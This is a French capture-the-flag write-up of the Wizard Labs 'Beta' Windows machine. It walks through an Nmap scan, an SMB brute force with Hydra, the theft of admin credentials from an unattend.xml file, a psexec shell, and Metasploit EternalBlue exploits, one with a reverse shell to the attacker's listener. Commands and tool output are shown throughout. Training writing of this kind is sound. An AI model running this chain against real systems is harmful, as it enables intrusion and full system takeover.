# Solution du CTF Beta de Wizard-Labs

Alpha
-----

*Beta* est un CTF proposé par *Wizard Labs* et basé sur Windows. Sa difficulté est notée à 4/10.  

Beta
----

Voici le résultat (épuré) d'un scan Nmap lancé avec *--script safe* :  

```plain
Nmap scan report for 10.1.1.15
Host is up (0.051s latency).
Not shown: 62210 closed ports, 3311 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
23/tcp    open  telnet       Microsoft Windows XP telnetd (no more connections allowed)
| telnet-encryption: 
|_  Telnet server does not support encryption
80/tcp    open  http         Apache httpd 2.4.34 ((Win32) OpenSSL/1.1.0i PHP/7.2.9)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
443/tcp   open  ssl/http     Apache httpd 2.4.34 ((Win32) OpenSSL/1.1.0i PHP/7.2.9)
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
3000/tcp  open  http         Gogs git httpd (lang: en-US)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49948/tcp open  unknown

|_smb-mbenum: Not a master or backup browser
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Beta
|   NetBIOS computer name: BETA\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-02-23T14:28:47+01:00
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|_    2.10
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
| smb2-capabilities:
|   2.02:
|     Distributed File System
|   2.10:
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-02-23 14:28:47
|_  start_date: 2018-09-23 21:40:53
```

On a un port telnet, pas très commun pour du Windows, en revanche on retrouve les classiques ports 135/139/445 qui nous révèlent que la machine se nomme *BETA* et est visiblement vulnérable à une faille touchant l'implémentation Microsoft de SMBv1.  

Toutefois la curiosité ma porté naturellement sur le port 3000 qui fait tourner une appli web baptisée *Gogs* .  

![Wizard Labs Beta CTF Gogs index](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/beta_gogs_index.png)

Cette application est connue pour être vulnérable à deux failles d'injection SQL :  

```plain
$ searchsploit gogs
-------------------------------------------- ----------------------------------------
 Exploit Title                              |  Path
                                            | (/usr/share/exploitdb/)
-------------------------------------------- ----------------------------------------
Gogs - 'label' SQL Injection                | exploits/multiple/webapps/35237.txt
Gogs - 'users'/'repos' '?q' SQL Injection   | exploits/multiple/webapps/35238.txt
-------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

La première concerne la gestion des issues sur un dépôt, l'autre la recherche de dépôt. Les commandes sqlmap suivantes devraient permettre d'en savoir plus :  

```bash
sqlmap -u "http://10.1.1.15:3000/russel/Beta-scripts/issues?labels=&type=&state=" -p labels
sqlmap -u "http://10.1.1.15:3000/api/v1/repos/search?q=beta" -p q
```

Malheureusement rien ne ressort, l'application devant être dans une version corrigée :(   

On trouve toutefois un script intéressant dans le dépôt *Beta-scripts* d'un certain *Russel* :  

```python
"""
Just a secure password generator made by Russel T !! Used to generate passwords  mostly for file sharing protocols 
Contact:russel@beta.corp
"""

import random
import sys

menu = """
__             ___                 ___         __ 
/ _\ ___  ___  / _ \__ _ ___ ___   / _ \___  /\ \ \
\ \ / _ \/ __|/ /_)/ _` / __/ __| / /_\/ _ \/  \/ /
_\ \  __/ (__/ ___/ (_| \__ \__ \/ /_\\  __/ /\  / 
\__/\___|\___\/    \__,_|___/___/\____/\___\_\ \/  
                                                                Beta Corp
"""

words = ['lollip0p','rain','summer','little','honey']
end  = [1,2,3,4,5]

print(menu)

word = random.choice(words)
num = random.choice(end)

password = (word)+(str(num))

print("the secure password is : {}".format(password))
```

Ce *Russel* a visiblement une vision un peu faussée de ce qu'est un mot de passe fort :D  

Prenons le au jeu en générant une wordlist de ces mots de passe *\*secure\** :  

```python
from itertools import product

words = ['lollip0p','rain','summer','little','honey']
end  = [1,2,3,4,5]

for word, num in product(words, end):
    print("{}{}".format(word, num))
```

On balance ensuite tout ça à Hydra sur le port SMB :  

```plain
$ hydra -l russel -P words.txt smb://10.1.1.15
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2019-02-23 15:00:07
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:1/p:25), ~25 tries per task
[DATA] attacking smb://10.1.1.15:445/
[445][smb] host: 10.1.1.15   login: russel   password: little5
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2019-02-23 15:00:10
```

Gamma
-----

On a alors accès au disque :  

```plain
$ smbclient -I 10.1.1.15 -U russel -L BETA
Enter WORKGROUP\russel's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
Connection to 10.1.1.15 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

$ smbclient -I 10.1.1.15 -U russel '//beta/c$'
Enter WORKGROUP\russel's password: 
Try "help" to get a list of possible commands.
smb: \> pwd
Current directory is \\beta\c$\
```

Cet accès est suffisant pour obtenir le flag de l'utilisateur (436bf1fd7f32f885a38d920f7e7ddedb).  

Mais... wait... que vois-je à la racine du shell ? Est-ce un oiseau? Est-ce un avion ? Mieux que ça c'est un fichier *unattend* :)  

```plain
smb: \> dir
  $Recycle.Bin                      DHS        0  Sun Sep 23 15:56:37 2018
  autoexec.bat                        A       24  Wed Jun 10 23:42:20 2009
  config.sys                          A       10  Wed Jun 10 23:42:20 2009
  Documents and Settings            DHS        0  Tue Jul 14 06:53:55 2009
  gogs                                D        0  Sun Sep 23 14:43:16 2018
  hiberfil.sys                      AHS 2415517696  Sat Sep 22 21:18:21 2018
  pagefile.sys                      AHS 3220692992  Sat Sep 22 21:18:21 2018
  PerfLogs                            D        0  Tue Jul 14 04:37:05 2009
  Program Files                      DR        0  Sun Sep 23 13:32:03 2018
  ProgramData                        DH        0  Sat Sep 22 22:30:48 2018
  Recovery                          DHS        0  Sat Sep 22 21:41:36 2018
  shell.exe                           A      341  Fri Feb 22 13:23:18 2019
  shellabc.exe                        A      341  Fri Feb 22 13:23:51 2019
  System Volume Information         DHS        0  Wed Feb 20 18:40:23 2019
  unattend.xml                        A     3578  Sun Sep 23 15:59:04 2018
  Users                              DR        0  Sun Sep 23 15:56:20 2018
  Windows                             D        0  Fri Feb 22 13:22:33 2019
  xampp                               D        0  Sat Sep 22 22:32:24 2018

                13081087 blocks of size 4096. 9568320 blocks available
```

On trouve effectivement des identifiants dans le fichier :  

```html
<Credentials>
    <Username>Administrator</Username>
    <Domain>beta</Domain>
    <Password>loveLyp4ssw0rd*!</Password>
</Credentials>
```

Si ça c'est pas mignon :p Les identifiants admin permettent de récupérer le flag final (f1f95d42573c2f3940bfae6fdba05e5a). That's it !  

On peut aussi obtenir un shell via le script psexec.py de Impacket par exemple :  

```plain
$ PYTHONPATH=. python2 examples/psexec.py 'BETA/Administrator:loveLyp4ssw0rd*!@10.1.1.15'
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Requesting shares on 10.1.1.15.....
[*] Found writable share ADMIN$
[*] Uploading file pFwNnYkJ.exe
[*] Opening SVCManager on 10.1.1.15.....
[*] Creating service XvJH on 10.1.1.15.....
[*] Starting service XvJH.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>exit
[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on 10.1.1.15.....
[*] Stoping service XvJH.....
[*] Removing service XvJH.....
[*] Removing file pFwNnYkJ.exe.....
```

Delta
-----

Qu'en est-il de cette fameuse faille SMB ? Metasploit dispose de plusieurs exploits pour cette faille largement connue sous le nom d'*EternalBlue* :  

```plain
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.1.1.15        yes       The target address range or CIDR identifier
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The local listener hostname
   LPORT     443              yes       The local listener port
   LURI                       no        The HTTP Path

Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs

msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started HTTPS reverse handler on https://10.254.0.29:443
[*] 10.1.1.15:445 - Connecting to target for exploitation.
[+] 10.1.1.15:445 - Connection established for exploitation.
[+] 10.1.1.15:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.1.1.15:445 - CORE raw buffer dump (42 bytes)
[*] 10.1.1.15:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.1.1.15:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.1.1.15:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.1.1.15:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.1.1.15:445 - Trying exploit with 12 Groom Allocations.
[*] 10.1.1.15:445 - Sending all but last fragment of exploit packet
[*] 10.1.1.15:445 - Starting non-paged pool grooming
[+] 10.1.1.15:445 - Sending SMBv2 buffers
[+] 10.1.1.15:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.1.1.15:445 - Sending final SMBv2 buffers.
[*] 10.1.1.15:445 - Sending last fragment of exploit packet!
[*] 10.1.1.15:445 - Receiving response from exploit packet
[+] 10.1.1.15:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.1.1.15:445 - Sending egg to corrupted connection.
[*] 10.1.1.15:445 - Triggering free of corrupted buffer.
[-] 10.1.1.15:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.1.1.15:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.1.1.15:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.1.1.15:445 - Connecting to target for exploitation.
[-] 10.1.1.15:445 - Rex::ConnectionTimeout: The connection timed out (10.1.1.15:445).
[*] Exploit completed, but no session was created.
```

Ici on voit que l'exploitation semble bien partir mais fait finalement crasher la machine (BSOD, la machine ne répond plus au ping).  

Epsilon
-------

Un autre exploit est disponible dans le framework Metasploit qui s'appelle *ms17\_010\_psexec*. Cet exploit a besoin d'accéder à un *named pipe* et *Metasploit* va en tenter différents pour l'exploitation (*netlogon*, *lsarpc*, *samr*, *browser*, etc).  

L'exploit échoue faute de trouver ou accéder à l'un de ces pipes. On peut alors utiliser les identifiants de *Russel* pour accéder aux pipes et permettre l'exploitation qui a réussie avec un payload assez basique.  

```plain
msf5 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                10.1.1.15                                                       yes       The target address range or CIDR identifier
   RPORT                 445                                                             yes       The Target port
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 C$                                                              yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass               little5                                                         no        The password for the specified username
   SMBUser               russel                                                          no        The username to authenticate as

Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     443              yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.254.0.29:443
[*] 10.1.1.15:445 - Authenticating to 10.1.1.15 as user 'russel'...
[*] 10.1.1.15:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.1.1.15:445 - Built a write-what-where primitive...
[+] 10.1.1.15:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.1.1.15:445 - Selecting PowerShell target
[*] 10.1.1.15:445 - Executing the payload...
[+] 10.1.1.15:445 - Service start timed out, OK if running a command or non-service executable...
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.1.1.15
[*] Command shell session 1 opened (10.254.0.29:443 -> 10.1.1.15:64657) at 2019-02-23 16:20:22 +0100

C:\Windows\system32>whoami
nt authority\system
```

Zeta
----

C'est tout pour ce CTF qui était très facile :)

*Published November 17 2020 at 13:55*